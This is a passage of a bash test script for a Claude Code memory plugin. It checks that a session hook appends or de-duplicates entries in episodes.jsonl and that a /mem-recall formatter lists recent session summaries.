    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

inject_hook_episode_no_file
inject_hook_episode_fresh
inject_hook_episode_stale_no_summary
inject_hook_episode_stale_has_summary

# =============================================================================
# hook-session-summary
# =============================================================================

echo
$LIST || echo "== hook-session-summary =="

session_hook_happy_path() {
  # Verifies a new session_id appends a metadata entry to episodes.jsonl.
  # Steps:
  #   1. Create a project memory dir with no episodes.jsonl
  #   2. Run session hook with a valid payload (cwd + session_id)
  #   3. Assert exit 0 and episodes.jsonl has one line with correct session_id
  local name="session-hook/happy-path"
  should_run "$name" || return 0
  local dir cwd payload status episodes entry
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"sess-001\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  episodes="$dir/projects/$(inject_encoded_path "$cwd")/memory/episodes.jsonl"
  entry="$(cat "$episodes" 2>/dev/null || true)"
  if [[ "$status" == "0" && "$entry" == *'"session_id":"sess-001"'* && "$entry" == *'"summary":""'* ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s entry=%q\n' "$name" "$status" "$entry"
  fi
  rm -rf "$dir"
}

session_hook_duplicate_no_summary() {
  # Verifies same session_id with empty summary is NOT appended again.
  # Steps:
  #   1. Pre-populate episodes.jsonl with a skeleton entry for session-abc
  #   2. Run session hook with the same session_id
  #   3. Assert episodes.jsonl still has exactly 1 line (no duplicate)
  local name="session-hook/duplicate-no-summary"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"session-abc","summary":""}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"session-abc\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 1 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_duplicate_has_summary() {
  # Verifies same session_id with non-empty summary is NOT appended again.
  # Steps:
  #   1. Pre-populate episodes.jsonl with a full entry for session-abc
  #   2. Run session hook with the same session_id
  #   3. Assert episodes.jsonl still has exactly 1 line
  local name="session-hook/duplicate-has-summary"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"session-abc","summary":"Done work."}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"session-abc\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 1 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_new_session_appends() {
  # Verifies a new session_id appends to an existing episodes.jsonl.
  # Steps:
  #   1. Pre-populate episodes.jsonl with one completed entry
  #   2. Run hook with a DIFFERENT session_id
  #   3. Assert episodes.jsonl now has 2 lines
  local name="session-hook/new-session-appends"
  should_run "$name" || return 0
  local dir cwd payload status line_count encoded
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  write_inject_memory "$dir" "$cwd" $'- alpha\n'
  encoded="$(inject_encoded_path "$cwd")"
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"%s","session_id":"old-sess","summary":"Old work."}\n' "$cwd" \
    > "$dir/projects/$encoded/memory/episodes.jsonl"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"new-sess\"}"
  printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null
  status=$?
  line_count=$(wc -l < "$dir/projects/$encoded/memory/episodes.jsonl")
  if [[ "$status" == "0" && "$line_count" -eq 2 ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s lines=%s\n' "$name" "$status" "$line_count"
  fi
  rm -rf "$dir"
}

session_hook_no_memory_dir() {
  # Verifies exit 0 with no output when no matching project memory dir exists.
  # Steps:
  #   1. Create a config dir with no projects
  #   2. Run hook with a cwd that has no ancestor memory dir
  #   3. Assert exit 0 and no episodes.jsonl created
  local name="session-hook/no-memory-dir"
  should_run "$name" || return 0
  local dir cwd payload output status
  dir="$(mktemp -d)"
  cwd="$dir/workspace"
  mkdir -p "$cwd"
  payload="{\"cwd\":\"$cwd\",\"session_id\":\"s1\"}"
  output=$(printf '%s' "$payload" | CLAUDE_CONFIG_DIR="$dir" "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
  rm -rf "$dir"
}

session_hook_malformed_payload() {
  # Verifies exit 0 with no output when payload is not valid JSON.
  # Steps:
  #   1. Send non-JSON string to session hook stdin
  #   2. Assert exit 0 and empty stdout
  local name="session-hook/malformed-payload"
  should_run "$name" || return 0
  local output status
  output=$(printf 'not json' | "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

session_hook_empty_stdin() {
  # Verifies exit 0 with no output when stdin is empty.
  local name="session-hook/empty-stdin"
  should_run "$name" || return 0
  local output status
  output=$(printf '' | "$SESSION_HOOK" 2>/dev/null)
  status=$?
  if [[ "$status" == "0" && -z "$output" ]]; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — exit=%s output=%q\n' "$name" "$status" "$output"
  fi
}

session_hook_happy_path
session_hook_duplicate_no_summary
session_hook_duplicate_has_summary
session_hook_new_session_appends
session_hook_no_memory_dir
session_hook_malformed_payload
session_hook_empty_stdin

# =============================================================================
# command validators — /mem-recall injection format
# =============================================================================
$LIST || echo "== mem-recall format validator =="

mem_recall_format_validator() {
  # Validates that the /mem-recall logic (read last N non-empty-summary entries
  # from episodes.jsonl) produces the expected injection format.
  # This scriptable validator exercises the data contract that /mem-recall depends on.
  local name="mem-recall/format-validator"
  should_run "$name" || return 0
  local dir episodes result
  dir="$(mktemp -d)"
  episodes="$dir/episodes.jsonl"

  # Write 3 entries: 2 with summary, 1 skeleton (should be skipped)
  printf '{"date":"2026-01-01T00:00:00+00:00","cwd":"/proj","session_id":"s1","summary":"First session: fixed bug X."}\n' >> "$episodes"
  printf '{"date":"2026-01-02T00:00:00+00:00","cwd":"/proj","session_id":"s2","summary":""}\n' >> "$episodes"
  printf '{"date":"2026-01-03T00:00:00+00:00","cwd":"/proj","session_id":"s3","summary":"Third session: added feature Y."}\n' >> "$episodes"

  result=$(python3 - "$episodes" 5 << 'PYEOF'
import json, sys
episodes_file, raw_n = sys.argv[1], sys.argv[2]
n = int(raw_n)
entries = []
with open(episodes_file) as f:
    for line in f:
        line = line.strip()
        if not line:
            continue
        try:
            e = json.loads(line)
        except json.JSONDecodeError:
            continue
        if e.get('summary', '').strip():
            entries.append(e)
recent = entries[-n:]
print(f'== Recent episodes (last {len(recent)}) ==')
print()
for e in recent:
    print(f'[{e["date"]}] {e["cwd"]}')
    print(e['summary'])
    print()
print('== end episodes ==')
PYEOF
)

  local ok=true
  [[ "$result" == *"== Recent episodes (last 2) =="* ]] || ok=false
  [[ "$result" == *"First session: fixed bug X."* ]] || ok=false
  [[ "$result" == *"Third session: added feature Y."* ]] || ok=false
  [[ "$result" == *"== end episodes =="* ]] || ok=false
  # Skeleton entry must NOT appear in output
  [[ "$result" != *'"summary":""'* ]] || ok=false

  rm -rf "$dir"

  if $ok; then
    PASS=$((PASS+1))
    [[ "${VERBOSE:-}" ]] && printf '  PASS  %s\n' "$name"
  else
    FAIL=$((FAIL+1))
    FAILED_CASES+=("$name")
    printf '  FAIL  %s — output=%q\n' "$name" "$result"
  fi
}

mem_recall_format_validator

# =============================================================================
# summary
# =============================================================================

if $LIST; then
  printf '%s\n' "${ALL_CASES[@]}"
  exit 0
fi

echo
echo "----"
echo "$PASS passed, $FAIL failed"
if [[ $FAIL -gt 0 ]]; then
  echo "failed cases:"
  for c in "${FAILED_CASES[@]}"; do
    echo "  - $c"
  done
  exit 1
fi
exit 0
